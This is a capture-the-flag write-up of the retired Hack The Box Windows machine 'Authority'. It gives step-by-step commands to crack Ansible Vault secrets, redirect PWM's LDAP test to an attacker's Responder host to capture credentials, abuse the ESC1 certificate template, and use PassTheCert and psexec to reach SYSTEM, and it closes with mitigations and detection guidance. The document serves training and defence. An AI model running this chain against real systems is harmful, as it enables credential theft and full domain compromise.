---
machine: Authority
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows / Active Directory
state: Retired
tags: [windows, active-directory, smb, ansible-vault, pwm, ldap, adcs, esc1, passthecert]
---

# Authority — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired based on public writeups; not verified with an HTB session.
> Method note: no flags or real credentials.

## TL;DR

Domain controller `authority.htb` with a `Development` share readable without authentication. It contains an Ansible repository with three Ansible Vault secrets; the vault password falls to `rockyou` and unlocks the **PWM** manager on port 8443. From its configuration editor the LDAP URL used by the connection test is pointed at a local Responder, and PWM hands over `svc_ldap`'s credentials in clear text. That account has WinRM and can enumerate ADCS: the `CorpVPN` template is **ESC1** and allows `Domain Computers` to enrol. With `MachineAccountQuota=10` a computer account is created, a certificate with Administrator's UPN is requested, and because the DC does not support PKINIT, **PassTheCert** over LDAP adds `svc_ldap` to `Administrators` and yields SYSTEM through `psexec`.

## Recon

```bash
nmap -p- --min-rate 3000 -T4 -Pn -oA nmap_all <IP>
nmap -p53,80,88,135,139,389,445,464,636,3268,3269,5985,8443,9389 -sCV -Pn -oA nmap_svc <IP>
```

```text
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 10.0 (default page)
88/tcp    kerberos-sec  Microsoft Windows Kerberos
389/tcp   ldap          AD LDAP (Domain: authority.htb)
445/tcp   microsoft-ds
636/tcp   ssl/ldap
3268/tcp  ldap          Global Catalog
5985/tcp  http          WinRM
8443/tcp  ssl/http      Apache Tomcat
9389/tcp  mc-nmf
```

- 88/389/3268 confirm a **Domain Controller**; the domain is `authority.htb`.
- Port 8443 is not AD: it is **PWM** on Tomcat, and it is the way in.
- The LDAPS certificate is signed by `AUTHORITY-CA`: ADCS is present.
- Tomcat's certificate CN is a private IP (`172.16.2.118`), a sign of a cloned deployment with the original certificate.

```bash
printf '%s\n' '<IP> authority.htb authority.authority.htb AUTHORITY' | sudo tee -a /etc/hosts
```

## Enumeration

### Anonymous SMB

Null sessions are allowed and `Development` is readable by guest:

```bash
netexec smb authority.htb -u guest -p '' --shares
smbclient -N //authority.htb/Development
```

```text
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

The download leaves an `Automation/Ansible/` tree with `ADCS`, `LDAP`, `PWM` and `SHARE` roles. The interesting file is:

```text
Development/Automation/Ansible/PWM/defaults/main.yml
```

It holds three Ansible Vault-encrypted values:

```yaml
pwm_admin_login: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
pwm_admin_password: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
ldap_admin_password: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
```

### From the vault to PWM

Each block is saved to its own file (header `$ANSIBLE_VAULT` included) and converted for Hashcat:

```bash
ansible2john pwm_admin_login.vault > hashes.txt
ansible2john pwm_admin_password.vault >> hashes.txt
hashcat -m 16900 hashes.txt /usr/share/wordlists/rockyou.txt
```

All three entries share the same vault password, `<PASS_VAULT>`. Decrypt them one by one:

```bash
ansible-vault decrypt pwm_admin_login.vault
ansible-vault decrypt pwm_admin_password.vault
```

Recovered credentials (placeholders):

```text
pwm_admin_login    = svc_pwm
pwm_admin_password = <PASS_PWM>
ldap_admin_password = <PASS_LDAP_VAULT>
```

`svc_pwm` does not work on PWM's normal login, but it does on the **Configuration Manager** at `https://authority.htb:8443/pwm/`. From there, `PwmConfiguration.xml` mentions `CN=svc_ldap`, the account the application uses to bind to LDAP.

## Foothold

### Capturing the LDAP credential

In the **Configuration Editor**, under `LDAP > LDAP Directories > default > Connection`, the LDAP server URL can be edited and **Test LDAP Profile** pressed. PWM decrypts the stored password and binds to whatever URL is configured.

Point it at the attacker host:

```text
ldap://<LHOST>:389
```

With Responder listening:

```bash
sudo responder -I tun0
```

When the test runs, PWM connects in clear text and hands over the service account's credentials:

```text
svc_ldap:<PASS_SVC_LDAP>
```

This is not an LDAP flaw: an application lets the destination of a credential test be changed and does not enforce a secure channel. The account can use **WinRM**:

```bash
evil-winrm -i authority.htb -u svc_ldap -p '<PASS_SVC_LDAP>'
```

The user flag is read from that session.

## Privilege escalation

### ADCS: the CorpVPN template (ESC1)

```bash
certipy-ad find -u svc_ldap -p '<PASS_SVC_LDAP>' -target authority.htb -text -stdout -vulnerable
```

Relevant output:

```text
CA Name: AUTHORITY-CA
Template Name: CorpVPN
Client Authentication: True
Enrollee Supplies Subject: True
Enrollment Rights: AUTHORITY.HTB\Domain Computers
Vulnerability: ESC1
```

The template lets the requester supply the **subject/SAN** and allows client authentication. Because `Domain Computers` holds the enrolment right, no privileged user is needed: a computer account is enough.

### Computer account and certificate

```bash
netexec ldap authority.htb -u svc_ldap -p '<PASS_SVC_LDAP>' -M maq
```

`MachineAccountQuota` is 10. Create a computer over LDAPS (simple LDAP writes are restricted):

```bash
addcomputer.py 'authority.htb/svc_ldap' -method LDAPS \
  -computer-name '<MACHINE>' -computer-pass '<PASS_MACHINE>' \
  -dc-ip <IP>
```

With the computer created, request a certificate whose UPN is Administrator's:

```bash
certipy-ad req -u '<MACHINE>$@authority.htb' -p '<PASS_MACHINE>' \
  -ca AUTHORITY-CA -dc-ip <IP> -template CorpVPN \
  -upn administrator@authority.htb
```

The result is `administrator.pfx`. The tempting next step is Kerberos:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <IP>
```

```text
KDC_ERR_PADATA_TYPE_NOSUPP
```

The certificate is valid, but the DC has no KDC certificate for PKINIT. The error does not invalidate the certificate: it changes the authentication channel.

### PassTheCert over LDAP

Split the PFX into key and certificate:

```bash
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
```

PassTheCert uses the certificate to authenticate over **Schannel/LDAPS** and opens an LDAP shell:

```bash
git clone https://github.com/AlmondOffSec/PassTheCert
cd PassTheCert/Python
python3 passthecert.py -action ldap-shell \
  -crt ../../administrator.crt -key ../../administrator.key \
  -domain authority.htb -dc-ip <IP>
```

Inside the shell:

```text
add_user_to_group svc_ldap administrators
```

That adds `svc_ldap` to the DC's `Administrators` group (`BUILTIN\Administrators`). Since the account already had WinRM, it can now run as an administrator:

```bash
psexec.py 'svc_ldap:<PASS_SVC_LDAP>@authority.htb'
```

```text
nt authority\system
```

SYSTEM reads the root flag.

## Evidence

- `nmap` output with the DC, 8443 and 5985.
- `netexec smb ... --shares` showing `Development` readable by guest.
- `main.yml` with the three `!vault` blocks (values trimmed).
- `hashcat -m 16900` and `ansible-vault decrypt` with the password redacted.
- Responder capture for `svc_ldap` with the password redacted.
- `certipy-ad find` showing `CorpVPN` and `ESC1`.
- `addcomputer.py` and `certipy-ad req` with Administrator's UPN.
- `KDC_ERR_PADATA_TYPE_NOSUPP` and the PassTheCert shell.
- `psexec.py` with `nt authority\system`, no real flags.

## Lessons learned

- A development share can hold the infrastructure's full automation; encrypted secrets are only as strong as the vault password.
- `ansible2john` plus Hashcat mode 16900 turns a vault into an offline hash; a vault protected by `rockyou` protects nothing.
- An outbound connection test leaks credentials when its destination is editable: the flaw is in the application, not in LDAP.
- ESC1 is not always abused by a user: if the template allows `Domain Computers` to enrol, a newly created computer account is enough.
- `KDC_ERR_PADATA_TYPE_NOSUPP` does not make the certificate useless; PassTheCert reuses it over LDAPS.
- Adding the account to `Administrators` and using `psexec` avoids depending on DCSync or an interactive logon.

## Mitigations and detection

- Disable SMB null/guest sessions and restrict `Development` to the groups that need it; never store automation with secrets on readable shares.
- Rotate the vault password and use an audited secret manager; do not reuse the password across entries.
- In PWM, validate the LDAP URL against an allowlist, require LDAPS and prevent a configuration user from pointing it at an arbitrary host.
- In ADCS, remove `Supply in the request` from `CorpVPN`, require manager approval or authorized signatures, and limit enrolment to specific groups.
- Reduce `MachineAccountQuota` to 0 when it is not needed; monitor computer account creation.
- Detection: anomalous reads of the `Development` share (5140/5145); outbound LDAP binds from PWM; LDAP binds by service accounts from unusual hosts (4624/4625, 4768/4769); template changes (5136); certificate requests and issuance (4886/4887); additions to `Administrators` (4728/4732); service creation by `psexec` (7045).
- Review templates with `certipy-ad find -vulnerable`, Defender for Identity and Microsoft's ESC1 guidance.

MITRE: T1552.001, T1078.002, T1087.002, T1649, T1021.006, T1021.002.

## References

- <https://thehacksparrow.com/authority>
- <https://archwarden.com/writeups/htb-authority>
- <https://specterops.io/blog/2021/06/17/certified-pre-owned>
- <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1>
- <https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers>
- <https://github.com/AlmondOffSec/PassTheCert>
- <https://github.com/ly4k/Certipy>
